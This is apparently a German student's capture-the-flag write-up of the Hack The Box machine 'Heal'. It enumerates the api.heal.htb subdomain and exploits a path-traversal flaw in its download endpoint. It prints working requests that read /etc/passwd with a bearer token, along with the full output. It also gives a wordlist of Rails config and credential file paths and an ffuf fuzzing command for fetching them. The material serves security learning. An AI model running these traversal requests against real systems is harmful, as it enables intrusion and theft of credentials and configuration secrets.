# Subdomain http://api.heal.htb

Gefunden anhand von BurpSuite
![img.png](../../../img/api-heal-htb.png)

## Dummheit
Ich habe den api.heal.htb Pfad relativ früh bei BurpSuite bemerkt, jedoch habe
ich total vergessen diesen in die <code>/etc/hosts</code> Datei einzutragen und habe mich dann
viel zu lange mit allem anderen befasst und mich gewundert warum es nicht geht.
Die genaue Anzahl an Stunden die ich damit verschwendet habe will ich nicht nennen xD
---

# Whatweb Scan http://api.heal.htb
```
Command:

whatweb http://api.heal.htb
```
```
Result:

http://api.heal.htb [200 OK] 
Country[RESERVED][ZZ],
HTML5,
HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], 
IP[10.10.11.46],
Title[Ruby on Rails 7.1.4], 
UncommonHeaders[
    x-content-type-options,
    x-permitted-cross-domain-policies,
    referrer-policy,
    x-request-id
], 
X-Frame-Options[SAMEORIGIN], 
X-XSS-Protection[0], 
nginx[1.18.0]
```
## Ergebnis:
- API in Ruby mit dem Framework Rails geschrieben wurde in der Version 7.1.4
---


# Nikto Scan http://api.heal.htb
![nikto-scan_api.png](../../../img/nikto-scan_api.png)

```
Command:

nikto -h http://api.heal.htb -C -output nikto-scan-api.txt
```
```
Result:

- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.46
+ Target Hostname:    api.heal.htb
+ Target Port:        80
+ Start Time:         2025-04-26 07:39:19 (GMT-5)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 (Ubuntu)
+ /: Uncommon header 'x-runtime' found, with contents: 0.003180.
+ /: Uncommon header 'x-request-id' found, with contents: 8c2164dd-74c3-4364-bd2b-54dd463a1bb0.
+ /yhWIIevN.PRINT: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ 8830 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-04-26 08:00:53 (GMT-5) (1294 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
## Ergebnis:
- Nichts relevantes
---

# dirb Scan http://api.heal.htb

```
Command:

dirb http://api.heal.htb
```
```
Result:

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Apr 26 08:14:34 2025
URL_BASE: http://api.heal.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://api.heal.htb/ ----
+ http://api.heal.htb/download (CODE:401|SIZE:26)                                                                                                          
+ http://api.heal.htb/profile (CODE:401|SIZE:26)                                                                                                           
+ http://api.heal.htb/resume (CODE:401|SIZE:26)                                                                                                            
+ http://api.heal.htb/robots.txt (CODE:200|SIZE:99)                                                                                                        
                                                                                                                                                           
-----------------
END_TIME: Sat Apr 26 08:37:35 2025
DOWNLOADED: 4612 - FOUND: 4
```
## Ergebnis:
- Keine relevanten Informationen unter diesen Pfaden gefunden
---

# Website Enumeration
![img_1.png](../../../img/subdomain-techstack.png)

## Ergebnis:
- Ruby version: ruby 3.3.5 (2024-09-03 revision ef084cc8f4) [x86_64-linux]
- Rails version: 7.1.4
---

# BurpSuite
Mit Burp anschauen, was passiert wenn man sich die PDF generieren lässt und die Requests speichern.

![img.png](../../../img/subdomain-exports-path.png)

```
Request:

{
    "content":"\n      
    <!DOCTYPE html>\n
        <html>\n
            <head>\n
                <style>
                    \n body {
                        \n font-family: 'Roboto', sans-serif;
                        \n color: #333;
                        \n line-height: 1.6;
                        \n background-color: #f9f9f9;
                        \n padding: 20px;
                        \n
                    }

                    \n .resume-container {
                        \n max-width: 900px;
                        \n margin: 50px auto;
                        \n padding: 40px;
                        \n background-color: #fff;
                        \n box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
                        \n border-radius: 10px;
                        \n
                    }

                    \n h1, h2 {
                        \n color: #007bff;
                        \n margin-bottom: 20px;
                        \n
                    }

                    \n h1 {
                        \n font-size: 2.5em;
                        \n text-align: center;
                        \n margin-bottom: 40px;
                        \n
                    }

                    \n h2 {
                        \n font-size: 1.5em;
                        \n margin-top: 40px;
                        \n
                    }

                    \n .section {
                        \n margin-bottom: 30px;
                        \n
                    }

                    \n .section p {
                        \n margin: 5px 0;
                        \n
                    }

                    \n .section p strong {
                        \n color: #555;
                        \n
                    }

                    \n .contact-info {
                        \n text-align: center;
                        \n margin-bottom: 40px;
                        \n
                    }

                    \n .contact-info p {
                        \n margin: 5px 0;
                        \n font-size: 1.1em;
                        \n
                    }

                    \n .contact-info p strong {
                        \n color: #007bff;
                        \n
                    }

                    \n .education-section, .experience-section {
                        \n padding: 20px;
                        \n background-color: #f1f1f1;
                        \n border-radius: 5px;
                        \n margin-bottom: 20px;
                        \n
                    }

                    \n .education-section p, .experience-section p {
                        \n margin: 10px 0;
                        \n
                    }

                    \n        
                </style>
                \n
            </head>
            \n
            <body>\n
                <div class=\"resume-container\">\n 
                    <h1>Homer</h1>\n 
                    <p>Email: homer.simpson@test.de</p>\n 
                    <p>Phone: 1337</p>\n 
                    <h2>Education</h2>\n 
                    \n
                
                    <div class=\"education-section\">\n 
                        <p><strong>Institution:</strong> Harvard </p>\n 
                        <p><strong>Role:</strong> Gramaar</p>\n
                        <p><strong>Summary:</strong> I'm lernt lot here </p>\n
                    </div>
                
                    \n \n
                 
                    <h2>Experience</h2>\n \n
                    <div class=\"experience-section\">\n 
                        <p><strong>Company:</strong> Super Amazing Company</p>\n 
                        <p><strong>Role:</strong> Bestest at everything</p>\n 
                        <p><strong>Summary:</strong> I ware bestest mployee the eva had.</p>\n
                    </div>
                
                    \n \n
                 
                    <h2>Projects</h2>\n 
                    <p>- test</p>\n 
                
                    <h2>Skills</h2>\n 
                    <p>everything</p>\n 
                
                    <h2>Languages</h2>\n 
                    <p>al oof them</p>\n
                </div>
            \n
            </body>
            \n
        </html>\n    ",
    "format":"pdf"
}
```

```
Response:

{
    "message":"PDF created successfully",
    "filename":"411b67f9c828d4f0c156.pdf"
}
```

## Ergebnis:
### Zur Autorisierung wird ein Bearer Token verwendet
Bearer Tokens Prinzip nochmal wiederholen
- https://www.youtube.com/watch?v=2ZLHabaZZJs - YT Video
- Anwendungssicherheit Folien - 04 Entwurf-04-Authentifizierung#HTTP Auth mit Bearer Token

### Neue Interessante Pfade durch Burp:
```
OPTIONS http://api.heal.htb/download?filename=411b67f9c828d4f0c156.pdf

Response Header:
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 30 Apr 2025 11:40:18 GMT
Content-Length: 0
Connection: keep-alive
access-control-allow-origin: http://heal.htb
access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
access-control-expose-headers: 
access-control-max-age: 7200
access-control-allow-headers: authorization
```
```
POST http://api.heal.htb/exports

Response Header:
HTTP/1.1 201 Created
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 30 Apr 2025 11:40:18 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 76
Connection: keep-alive
access-control-allow-origin: http://heal.htb
access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
access-control-expose-headers: 
access-control-max-age: 7200
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
etag: W/"29caa47ab66df4f53921c36538cedeca"
cache-control: max-age=0, private, must-revalidate
x-request-id: 1635dbdf-fb6c-460d-9b90-5ec191956328
x-runtime: 0.317247
vary: Origin

{
  "message":"PDF created successfully",
  "filename":"36015cd7dbb9ebdf7e5d.pdf"
}
```

### Neue Erkenntnisse aus der Request:
1. Dadurch, dass im Response Header <code>access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD</code>
   stand bin ich in der Lage das HTTP Verb zu verändern und die Request erneut zu senden

#### Idee: Über eine LFI die <code>/etc/passwd</code> herunterladen kann
- Vorgehen:
1. Über BurpSuite den Request an den Repeater senden und dort die Request manipulieren
2. Header in GET ändern: ```http://api.heal.htb/download?filename=/etc/passwd```

#### Ergebnis:
```
Request:

GET /download?filename=/etc/passwd HTTP/1.1
Host: api.heal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Access-Control-Request-Method: GET
Access-Control-Request-Headers: authorization
Referer: http://heal.htb/
Origin: http://heal.htb
Connection: keep-alive
Priority: u=4
```
```
Response:

HTTP/1.1 401 Unauthorized
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 30 Apr 2025 12:09:33 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 26
Connection: keep-alive
access-control-allow-origin: http://heal.htb
access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
access-control-expose-headers: 
access-control-max-age: 7200
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
vary: Accept, Origin
cache-control: no-cache
x-request-id: 06af472b-dcfd-4255-8671-1cae9faefb7f
x-runtime: 0.002224

{
  "errors":"Invalid token"
}
```
![img_1.png](../../../img/pdf-LFI-try.png)
- Er benötigt einen validen Token => Ich muss den Token mitschicken, welchen ich bei der Anmeldung bekommen habe
  (oder erstelle einen neuen Account und nehme diesen Token)

Vorgehen:

- Ich nehme den Token aus der Anmeldung:
  ```eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo5fQ.ILOcMzCTZe1wDWM5gXNbBYBOPpSX43bOFdIKjJfpLU8``` und füge ihn der
  Request hinzu

![img.png](../../../img/LFI-works.png)

```
Request:

GET /download?filename=/etc/passwd HTTP/1.1
Host: api.heal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Access-Control-Request-Method: GET
Access-Control-Request-Headers: authorization
Referer: http://heal.htb/
Origin: http://heal.htb
Connection: keep-alive
Priority: u=4
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo5fQ.ILOcMzCTZe1wDWM5gXNbBYBOPpSX43bOFdIKjJfpLU8
```

```
Response:
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 30 Apr 2025 13:18:20 GMT
Content-Type: application/octet-stream
Content-Length: 2120
Connection: keep-alive
access-control-allow-origin: http://heal.htb
access-control-allow-methods: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD
access-control-expose-headers: 
access-control-max-age: 7200
x-frame-options: SAMEORIGIN
x-xss-protection: 0
x-content-type-options: nosniff
x-permitted-cross-domain-policies: none
referrer-policy: strict-origin-when-cross-origin
content-disposition: attachment; filename="passwd"; filename*=UTF-8''passwd
content-transfer-encoding: binary
cache-control: no-cache
x-request-id: 859964c9-2e41-4295-9e4f-73c616fc8a48
x-runtime: 0.003093
vary: Origin

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
avahi:x:114:120:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
geoclue:x:115:121::/var/lib/geoclue:/usr/sbin/nologin
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
ron:x:1001:1001:,,,:/home/ron:/bin/bash
```

Ergebnis:
- Alle User ersichtlich
```
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
ron:x:1001:1001:,,,:/home/ron:/bin/bash
```


```
ralph – Username (login name)

x – Placeholder for the password (the actual password is stored in /etc/shadow)

1000 – User ID (UID); 1000 is typically the first regular user created during system installation (root has UID 0)

1000 – Group ID (GID); refers to the user's primary group, often with the same name as the user

ralph – Comment or GECOS field; usually contains the user's full name, but can also be empty or hold other information

/home/ralph – Home directory; the user's personal directory

/bin/bash – Login shell; the default shell launched when the user logs in (in this case, Bash)
```
---

# Weitere LFI auf api.heal.htb
Dadurch, dass auf der api subdomain Ruby läuft, macht es Sinn dort zu schauen, ob es config files gibt.

Wo liegen diese standardmäßig?/Welche gibt es?
1. Quellen (Ruby configuration files):
    1. https://dev.to/vvo/secrets-environment-variables-config-files-the-ruby-on-rails-case-433f
    2. https://guides.rubyonrails.org/security.html#custom-credentials
    3. https://guides.rubyonrails.org/v7.1/debugging_rails_applications.html#the-logger

2. Anhand von den Quellen eigene kleine Liste zusammengebaut:
```
---------------
ruby-paths.txt
---------------
/app/controllers/application_controller.rb
/app/controllers/concerns/authentication.rb
/app/controllers/passwords_controller.rb
/app/controllers/sessions_controller.rb
/app/mailers/password_mailer.rb
/app/mailers/passwords_mailer.rb
/app/models/current.rb
/app/models/session.rb
/app/models/user.rb
/config/admin.rb
/config/api.rb
/config/application.rb
/config/boot.rb
/config/cable.yml
/config/credentials.yml
/config/credentials.yml.enc
/config/credentials/staging.yml.enc
/config/database.yml
/config/environments/development.rb
/config/environments/production.rb
/config/environments/staging.rb
/config/environments/test.rb
/config/initializers/content_security_policy.rb
/config/initializers/cors.rb
/config/initializers/filter_parameter_logging.rb
/config/initializers/permissions_policy.rb
/config/initializers/permolicy.rb
/config/puma.rb
/config/routes.rb
/config/routes/admin.rb
/config/routes/external/admin.rb
/config/wrap_parameters.rb
/db/schema.rb
/db/schema.sql
/log/development.log 
/log/production.log
```

3. Manuell ```/app/controllers/application_controller.rb``` getestet
   und den pfad so lange nach oben gegangen bis es bei ```../../app/controllers/application_controller.rb```
   geklappt hat
```
'Path Traversal' - Fachgerechte Name
```

5. Jetzt mit ```ffuf``` (https://github.com/ffuf/ffuf) die Liste anwenden und schauen welche Pfade es gibt
    - Komisch dabei: Bei mehrfachem scannen hatte ich teilweise unterschiedliche Pfade
```
Description:

ffuf  -u = HOST
      -w = WORDLIST
      -H = HEADER
      -mc= MATCH STATUS CODE
```

![fuzzing-ruby-api-subdomain.png](../../../img/fuzzing-ruby-api-subdomain.png)

```
ffuf  -u http://api.heal.htb/download?filename=../../FUZZ 
      -w ruby-paths.txt 
      -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE" 
      -mc 200
```

```
Result Paths:

/config/environments/test.rb                        [Status: 200, Size: 2643, Words: 348, Lines: 65, Duration: 37ms]
/config/initializers/filter_parameter_logging.rb    [Status: 200, Size: 448, Words: 57, Lines: 9, Duration: 231ms]
/config/initializers/cors.rb                        [Status: 200, Size: 500, Words: 77, Lines: 17, Duration: 332ms]
/config/cable.yml                                   [Status: 200, Size: 191, Words: 21, Lines: 11, Duration: 729ms]
/app/models/user.rb                                 [Status: 200, Size: 328, Words: 45, Lines: 16, Duration: 835ms]
/app/controllers/application_controller.rb          [Status: 200, Size: 56, Words: 4, Lines: 3, Duration: 929ms]
/config/environments/production.rb                  [Status: 200, Size: 4090, Words: 594, Lines: 91, Duration: 1032ms]
/config/database.yml                                [Status: 200, Size: 636, Words: 93, Lines: 26, Duration: 1130ms]
/config/credentials.yml.enc                         [Status: 200, Size: 456, Words: 1, Lines: 1, Duration: 1232ms]
/config/environments/development.rb                 [Status: 200, Size: 2513, Words: 339, Lines: 74, Duration: 1330ms]
:: Progress: [34/34] :: Job [1/1] :: 16 req/sec :: Duration: [0:00:02] :: Errors: 0 ::

more from other ffuf fuzz:
/config/boot.rb
/log/development.log
/config/application.rb
/config/routes.rb
/config/puma.rb
```

[API Path Findings](../api/api-findings.md)